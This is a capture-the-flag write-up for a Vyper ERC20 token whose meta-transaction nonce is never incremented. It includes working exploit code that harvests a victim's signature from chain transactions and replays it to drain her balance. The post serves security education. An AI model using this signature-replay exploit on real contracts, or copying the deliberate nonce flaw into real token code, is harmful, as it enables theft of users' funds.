## 1) Challenge

>{{< admonition quote "Description" >}}
>
>The Meta Tx contract is an ERC20 token with a builtin meta-transaction-based transfer. Another user has graciously made a meta-transfer to your account. Your objective is to drain their entire balance.
>
>{{< /admonition >}}

Challenge created by [@jtriley_eth](https://twitter.com/jtriley_eth).


## 2) Code Review

There is only one contract, `MetaToken.vy` ([source code](https://github.com/JoshuaTrujillo15/offensive_vyper/blob/main/contracts/meta-token/MetaToken.vy)) that implements a proxy contract.
```python

# @version ^0.3.2

"""
@title Token with Meta Transaction Support
@author jtriley.eth
"""

from vyper.interfaces import ERC20

implements: ERC20

event Transfer:
    sender: indexed(address)
    receiver: indexed(address)
    amount: uint256

event Approval:
    owner: indexed(address)
    spender: indexed(address)
    amount: uint256

name: public(String[32])

symbol: public(String[32])

decimals: public(uint8)

totalSupply: public(uint256)

balanceOf: public(HashMap[address, uint256])

allowance: public(HashMap[address, HashMap[address, uint256]])

nonce: public(uint256)

@external
def __init__(name: String[32], symbol: String[32], initial_supply: uint256):
    self.name = name
    self.symbol = symbol
    self.decimals = 18
    self.balanceOf[msg.sender] = initial_supply
    self.totalSupply = initial_supply


@external
def transfer(receiver: address, amount: uint256) -> bool:
    assert receiver != ZERO_ADDRESS, "zero address receiver"
    self.balanceOf[msg.sender] -= amount
    self.balanceOf[receiver] = unsafe_add(self.balanceOf[receiver], amount)
    log Transfer(msg.sender, receiver, amount)
    return True


@external
def approve(spender: address, amount: uint256) -> bool:
    self.allowance[msg.sender][spender] = amount
    log Approval(msg.sender, spender, amount)
    return True


@external
def transferFrom(sender: address, receiver: address, amount: uint256) -> bool:
    if (msg.sender != sender):
        self.allowance[sender][msg.sender] -= amount
    self.balanceOf[sender] -= amount
    self.balanceOf[receiver] = unsafe_add(self.balanceOf[receiver], amount)
    log Transfer(sender, receiver, amount)
    return True


@external
def metaTransfer(
    sender: address,
    receiver: address,
    amount: uint256,
    v: uint256,
    r: uint256,
    s: uint256
) -> bool:
    """
    @notice Transfers `amount` on `sender`'s behalf to `receiver`. Transfer is authenticated with an
    offchain EC digital signature. Signature components `v`, `r`, and `s` can be generated using
    client libraries are passed to `ecrecover` builtin. If `sender` does not match the recovered
    signer, the signature is invalid. A nonce is added to protect against replay attacks.
    @param sender Address from which to transfer.
    @param receiver Address to which to transfer.
    @param amount Amount to transfer.
    @param v Recovery component of ECDSA.
    @param r ECDSA 'R' coordinate.
    @param s ECDSA 'S' coordinate.
    """
    hash: bytes32 = keccak256(
        concat(
            convert(sender, bytes32),
            convert(receiver, bytes32),
            convert(amount, bytes32),
            convert(self.nonce, bytes32)
        )
    )

    message: bytes32 = keccak256(
        concat(
            b"\x19Ethereum Signed Message:\n32",
            hash
        )
    )

    signer: address = ecrecover(message, v, r, s)
    assert signer == sender, "invalid sender"

    self.balanceOf[sender] -= amount
    self.balanceOf[receiver] = unsafe_add(self.balanceOf[receiver], amount)

    return True

```

Contract main functions:
- `transfer` decreases the `balanceOf` variable for `msg.sender` and increases it for `receiver` with the amount transferred 
- `approve` approves the `spender` to spend the `amount` on behalf of `msg.sender`
- `transferFrom`, similar to `transfer`, but it first checks if the sender is approved to transfer the amount
- `metaTransfer` is the core function of this contract:
    - computes a `hash` by concatenating the `sender`, `receiver`, `amount` and `self.nonce` values (after they are converted to `bytes32`) - lines `92-99`
    - computes the `keccak256` hash of the string `b"\x19Ethereum Signed Message:\n32"` concatenated with the hash previously computed - lines `101-106`
    - calls `ecrecover` with `message`, `v`, `r` and `s` parameters to recover the `signer` of the message (line `108`)
    - checks if the `signer` is equal to the `sender` parameter (line `109`)
    - if the `signer` is equal to `sender`, it transfers the `amount` from `sender` to `receiver` (it updates the balances in `balanceOf`) - lines `111-112`

Looking at the project setup, we can see that `alice` calls the `metaTransfer` to transfer `10` tokens to our attacker address ([setup](https://github.com/dellalibera/offensive_vyper-solutions/blob/main/test/meta-token.challenge.js#L41-L48)). It computes the values for `v`, `r` and `s` by calling the `splitSignature` (lines `37-39` - [setup](https://github.com/dellalibera/offensive_vyper-solutions/blob/main/test/meta-token.challenge.js#L37-L39)) that in turn accepts a `messageHash` that is computed from the `alice` address, the `attacker` address, the `nonce` variable from the contract and the amount to transfer (i.e. `10`).

Our goal is to drain all the tokens from `alice` account.

#### How is the signer verified?

The signer is verified by calling `ecrecover` with the provided parameters (`v`, `r`, `s`) and the hash message. 


>The `@dev` comment for the `metaTransfer` says: 
><cite>A nonce is added to protect against replay attacks.</cite>
>A `nonce` variable in the contract is read to compute the message, but it is never updated. It will always be `0`, so a replay attack is possible.


If we know the values of `v`, `r`, and `s`, we can reuse them and perform the same transfer. The other information used to build the message is `sender` (`alice` address), `receiver` (`attacker` address), `amount` (`10`) and `self.nonce` (`0`).

#### How can we recover function parameters?

The parameters passed to `metaTransfer` (and thus to `ecrecover`) are part of the transaction data, so it's possible to retrieve them.
The `nonce` is never updated, so we can reply to the same message sent by `alice` and thus update the balance of our attacker. Since `alice` has `100` tokens and `10` are already sent to our attacker address during the challenge setup, if we call (i.e. reply) the `metaTransfer` function `9` times with the same data, we will be able to drain all the `alice` tokens (each transaction will increase the `balances` of our attacker by `10` tokens).


## 3) Solution

The solution consists of the following steps:
- traverse the latest blocks until we find the block containing the transaction done by `alice` where the `metaTransfer` function is called
- extract the parameters passed to `metaTransfer` that are `sender`, `receiver`, `amount`, `v`, `r`, and `s` 
- pass these values to our exploit contract that will call `metaTransfer` for `9` times

`meta-token.challenge.js`:
```javascript

    it('Exploit', async function () {
        // YOUR EXPLOIT HERE

        let exploit = await (await ethers.getContractFactory('MetaTokenExploit', deployer)).deploy(this.token.address)

        const iface = new ethers.utils.Interface(['function metaTransfer(address sender, address receiver, uint256 amount, uint256 v, uint256 r, uint256 s)'])

        const provider = attacker.provider

        let done = false;

        // iterate over latest blocks
        for(let blockNumber = 0; blockNumber < (await provider.getBlockNumber()); blockNumber++) {
        
            // get transactions hash
            let transactions = (await provider.getBlock(blockNumber)).transactions
            
            for(const txHash of transactions) {

                try {
                    // get the tx data ...
                    let txData = (await provider.getTransaction(txHash)).data
                    
                    // ... and try to decode it
                    let {sender, receiver, amount, v, r, s} = iface.decodeFunctionData('metaTransfer', txData)

                    expect(sender).to.be.equal(alice.address)
                    expect(receiver).to.be.equal(attacker.address)
                    
                    await exploit.connect(attacker).run(sender, attacker.address, amount, v, r, s);
                    done = true;

                } catch {}
            }

            if(done) break
        }

    })
    
```

`MetaTokenExploit.vy`:
```python

# YOUR EXPLOIT HERE
@external
def run(
    sender: address,
    receiver: address,
    amount: uint256,
    v: uint256,
    r: uint256,
    s: uint256
):
    for i in range(9):
        Token(self.target).metaTransfer(sender, receiver, amount, v, r, s)

```

You can find the complete code [here](https://github.com/dellalibera/offensive_vyper-solutions/blob/main/test/meta-token.challenge.js) and [here](https://github.com/dellalibera/offensive_vyper-solutions/blob/main/contracts/exploits/MetaTokenExploit.vy).


## 4) References

- [Solidity - ecrecover](https://docs.soliditylang.org/en/v0.8.17/units-and-global-variables.html)
- [SWC-117 - Signature Malleability](https://swcregistry.io/docs/SWC-117)
- [SWC-121 - Missing Protection against Signature Replay Attacks](https://swcregistry.io/docs/SWC-121)
